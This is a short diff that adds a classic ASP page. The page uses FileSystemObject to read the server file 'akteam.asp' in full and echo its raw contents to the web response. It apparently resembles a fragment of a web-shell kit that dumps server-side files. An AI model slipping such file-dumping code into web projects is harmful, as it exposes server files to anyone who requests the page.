@@ -1,0 +1,6 @@
+<%
+Set fs = CreateObject("Scripting.FileSystemObject")
+Set MyTextStream=fs.OpenTextFile(server.MapPath("\akteam.asp"),1,false,0)
+Thetext=MyTextStream.ReadAll
+response.write thetext
+%>
